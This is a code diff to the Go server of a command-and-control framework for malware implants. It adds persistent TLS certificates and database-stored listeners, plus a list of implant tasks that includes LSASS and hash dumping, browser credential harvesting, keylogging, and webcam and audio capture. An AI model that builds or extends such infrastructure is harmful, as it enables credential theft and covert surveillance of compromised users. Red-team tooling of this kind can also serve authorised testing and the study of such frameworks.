@@ -213,8 +213,38 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 		logrus.Errorf("Error: %s", result.Error)
 	}
 
-	// Helper to broadcast task completion
+	// Helper to broadcast task completion (only for long-running commands)
 	go func() {
+		// Get task type from database to check if it's a long-running command
+		task, err := s.db.GetTaskByID(result.TaskId)
+		if err != nil {
+			return // Can't determine task type, skip notification
+		}
+
+		// Only notify for long-running commands
+		longRunningCommands := map[string]bool{
+			"NETWORK_SCAN":        true,
+			"IFCONFIG":            true,
+			"HASHDUMP":            true,
+			"DUMP_LSASS":          true,
+			"HARVEST_CHROME":      true,
+			"HARVEST_FIREFOX":     true,
+			"HARVEST_EDGE":        true,
+			"HARVEST_ALL_BROWSERS": true,
+			"CLIPBOARD_MONITOR":   true,
+			"KEYLOG_STOP":         true,
+			"AUDIO_CAPTURE":       true,
+			"WEBCAM_CAPTURE":      true,
+			"EXECUTE_ASSEMBLY":    true,
+			"EXECUTE_SHELLCODE":   true,
+			"EXECUTE_PE":          true,
+			"EXECUTE_BOF":         true,
+		}
+
+		if !longRunningCommands[task.Type] {
+			return // Skip notification for quick commands
+		}
+
 		// Get implant info for notification
 		s.sessionsMux.RLock()
 		session, exists := s.sessions[result.ImplantId]
@@ -370,6 +400,9 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 	serverOptions = append(serverOptions, grpc.KeepaliveEnforcementPolicy(kaep), grpc.KeepaliveParams(kasp))
 	var g *grpc.Server
 
+	// Generate listener ID first so we can use it for persistent certificate naming
+	id := fmt.Sprintf("lst_%d", time.Now().UnixNano())
+
 	switch req.Type {
 	case pb.ListenerType_LISTENER_HTTP:
 		// No TLS
@@ -380,27 +413,24 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 		var cert tls.Certificate
 
 		if req.Type == pb.ListenerType_LISTENER_MTLS {
-			// For mTLS, automatically generate CA-signed server certificate
-			cert, err = s.caManager.GenerateServerCertificate(addr)
+			// For mTLS, load or generate persistent CA-signed server certificate
+			cert, err = s.caManager.LoadOrGenerateServerCertificate(id, addr)
 			if err != nil {
 				_ = ln.Close()
-				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to generate mTLS server certificate: %v", err)}, nil
+				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to load/generate mTLS server certificate: %v", err)}, nil
 			}
-			logrus.Infof("Generated CA-signed server certificate for mTLS listener %s", addr)
+			logrus.Infof("Loaded persistent CA-signed server certificate for mTLS listener %s", addr)
 		} else {
-			// For HTTPS, try to load existing certs first, then fallback to self-signed
+			// For HTTPS, try to load existing certs first, then fallback to persistent CA-signed
 			cert, err = tls.LoadX509KeyPair(certPath, keyPath)
 			if err != nil {
-				// Generate self-signed certificate if not found or invalid
-				host, _, _ := net.SplitHostPort(addr)
-				if host == "" {
-					host = "localhost"
-				}
-				cert, err = generateSelfSignedCertWithIP(host, addr)
+				// Load or generate persistent CA-signed certificate
+				cert, err = s.caManager.LoadOrGenerateServerCertificate("https-"+id, addr)
 				if err != nil {
 					_ = ln.Close()
-					return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("TLS self-sign failed: %v", err)}, nil
+					return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to load/generate HTTPS server certificate: %v", err)}, nil
 				}
+				logrus.Infof("Loaded persistent CA-signed server certificate for HTTPS listener %s", addr)
 			}
 		}
 
@@ -422,18 +452,16 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 		serverOptions = append(serverOptions, grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
 		g = grpc.NewServer(serverOptions...)
 	default:
-		// Default to HTTPS
+		// Default to HTTPS with persistent certificates
 		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
 		if err != nil {
-			host, _, _ := net.SplitHostPort(addr)
-			if host == "" {
-				host = "localhost"
-			}
-			cert, err = generateSelfSignedCertWithIP(host, addr)
+			// Load or generate persistent CA-signed certificate
+			cert, err = s.caManager.LoadOrGenerateServerCertificate("default-"+id, addr)
 			if err != nil {
 				_ = ln.Close()
-				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("TLS self-sign failed: %v", err)}, nil
+				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to load/generate default server certificate: %v", err)}, nil
 			}
+			logrus.Infof("Loaded persistent CA-signed server certificate for default listener %s", addr)
 		}
 		creds := credentials.NewTLS(&tls.Config{Certificates: []tls.Certificate{cert}, ClientAuth: tls.NoClientCert})
 		serverOptions = append(serverOptions, grpc.Creds(creds), grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
@@ -443,10 +471,12 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 	// Create a dedicated gRPC server bound to same service state
 	pb.RegisterC2ServiceServer(g, s)
 
-	id := fmt.Sprintf("lst_%d", time.Now().UnixNano())
 	l := &Listener{ID: id, Address: addr, StartedAt: time.Now(), ln: ln, srv: g, Type: req.Type}
 
-	// Note: Listeners are no longer saved to database to prevent persistence issues
+	// Save listener to database for persistence across restarts
+	if err := s.db.SaveListener(id, addr, req.Type.String(), certPath, keyPath, req.CaFile); err != nil {
+		logrus.Warnf("Failed to save listener to database: %v", err)
+	}
 
 	s.listenersMux.Lock()
 	s.listeners[id] = l
@@ -455,7 +485,7 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 	go func() {
 		if err := g.Serve(ln); err != nil {
 			logrus.Errorf("Listener %s serve error: %v", id, err)
-			// Note: Listener status no longer tracked in database
+			s.db.UpdateListenerStatus(id, "failed")
 		}
 	}()
 
@@ -484,7 +514,10 @@ func (s *C2Server) RemoveListener(ctx context.Context, req *pb.ListenerRemoveReq
 		_ = l.ln.Close()
 		delete(s.listeners, req.Id)
 
-		// Note: Listeners are no longer tracked in database
+		// Update listener status in database
+		if err := s.db.UpdateListenerStopped(req.Id); err != nil {
+			logrus.Warnf("Failed to update listener status in database: %v", err)
+		}
 	}
 	s.listenersMux.Unlock()
 	if !ok {
